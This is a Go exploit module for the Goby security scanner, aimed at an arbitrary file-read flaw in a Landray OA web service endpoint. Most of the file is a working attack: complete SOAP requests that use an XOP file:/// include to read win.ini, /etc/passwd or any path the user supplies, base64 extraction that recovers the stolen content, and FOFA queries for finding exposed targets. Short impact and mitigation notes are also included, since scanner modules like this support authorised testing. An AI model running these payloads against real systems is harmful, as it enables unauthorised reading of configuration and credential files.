package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Landray-OA /sys/webservice/sysFormMainDataInsystemWebservice File Read Vulnerability",
    "Description": "<p>Landray OA, independently developed by Shenzhen Landray Software Co., Ltd., is a fully online digital OA system designed for medium and large enterprises to facilitate online office operations. It includes 100 functional modules such as process management, knowledge management, meeting management, document management, task management, and supervision management.The /sys/webservice/sysFormMainDataInsystemWebservice interface contains an arbitrary file read vulnerability, which can lead to the disclosure of critical configuration files on the system.</p>",
    "Product": "Landray-OA",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2024-12-21",
    "PostTime": "2024-12-23",
    "Author": "yanyongju@baimaohui.net",
    "FofaQuery": "body=\"Com_Parameter\" || body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || (title=\"欢迎登录智慧协同平台\" && body=\"欢迎登录智慧协同平台\") || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "GobyQuery": "body=\"Com_Parameter\" || body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || (title=\"欢迎登录智慧协同平台\" && body=\"欢迎登录智慧协同平台\") || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "Level": "1",
    "Impact": "<p>Attackers can exploit this vulnerability to read critical system files, leaving the website in an insecure state.</p>",
    "Recommendation": "<p>1. Configure access policies using firewalls or other security devices, and set up a whitelist for authorized access.</p><p>2. If not necessary, restrict public internet access to the system.</p>",
    "References": [
        "https://github.com/wy876/POC"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,windows,linux",
            "show": ""
        },
        {
            "name": "default",
            "type": "textarea",
            "value": "C:/Windows/win.ini",
            "show": "attackType=default"
        },
        {
            "name": "windows",
            "type": "input",
            "value": "C:/Windows/win.ini",
            "show": "attackType=windows"
        },
        {
            "name": "linux",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=linux"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/sysFormMainDataInsystemWebservice",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
                    "Connection": "close",
                    "Content-Type": "multipart/related; boundary=----4upt9dwdca8rtwq9osuz",
                    "SOAPAction": "",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": "------4upt9dwdca8rtwq9osuz\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.maindata.xform.sys.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getData>\r\n        <arg0>\r\n            <beginTimeStamp>a</beginTimeStamp>\r\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\r\n        </arg0>\r\n    </web:getData>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n------4upt9dwdca8rtwq9osuz--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Unmarshalling Error: 意外的文本 \"OyBmb",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/sysFormMainDataInsystemWebservice",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
                    "Connection": "close",
                    "Content-Type": "multipart/related; boundary=----4upt9dwdca8rtwq9osuz",
                    "SOAPAction": "",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": "------4upt9dwdca8rtwq9osuz\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.maindata.xform.sys.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getData>\r\n        <arg0>\r\n            <beginTimeStamp>a</beginTimeStamp>\r\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///etc/passwd\"/></count>\r\n        </arg0>\r\n    </web:getData>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n------4upt9dwdca8rtwq9osuz--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Unmarshalling Error: 意外的文本 \"cm9vdD",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/sysFormMainDataInsystemWebservice",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
                    "Connection": "close",
                    "Content-Type": "multipart/related; boundary=----4upt9dwdca8rtwq9osuz",
                    "SOAPAction": "",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": "------4upt9dwdca8rtwq9osuz\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.maindata.xform.sys.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getData>\r\n        <arg0>\r\n            <beginTimeStamp>a</beginTimeStamp>\r\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///{{{filePath}}}\"/></count>\r\n        </arg0>\r\n    </web:getData>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n------4upt9dwdca8rtwq9osuz--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Unmarshalling Error: 意外的文本",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "resultBase64|lastbody|regex|\"([A-Za-z0-9+/=]+)\"",
                "output|define|base64_decode|{{{resultBase64}}}"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "蓝凌OA /sys/webservice/sysFormMainDataInsystemWebservice 文件读取漏洞",
            "Product": "Landray-OA系统",
            "Description": "<p>蓝凌OA 由深圳市蓝凌软件股份有限公司自主研发，是一款全程在线数字化OA，应用于大中型企业在线化办公。 包含流程管理、知识管理、会议管理、公文管理、任务管理及督办管理等100个功能模块。&nbsp;/sys/webservice/sysFormMainDataInsystemWebservice 接口处存在任意文件读取，会导致系统上面的关键配置文件泄露<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件，导致网站处于不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Landray-OA /sys/webservice/sysFormMainDataInsystemWebservice File Read Vulnerability",
            "Product": "Landray-OA",
            "Description": "<p>Landray OA, independently developed by Shenzhen Landray Software Co., Ltd., is a fully online digital OA system designed for medium and large enterprises to facilitate online office operations. It includes 100 functional modules such as process management, knowledge management, meeting management, document management, task management, and supervision management.The /sys/webservice/sysFormMainDataInsystemWebservice interface contains an arbitrary file read vulnerability, which can lead to the disclosure of critical configuration files on the system.<br></p>",
            "Recommendation": "<p>1. Configure access policies using firewalls or other security devices, and set up a whitelist for authorized access.</p><p>2. If not necessary, restrict public internet access to the system.<br></p>",
            "Impact": "<p>Attackers can exploit this vulnerability to read critical system files, leaving the website in an insecure state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/sys/webservice/sysFormMainDataInsystemWebservice"
    },
    "PocId": "9980"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}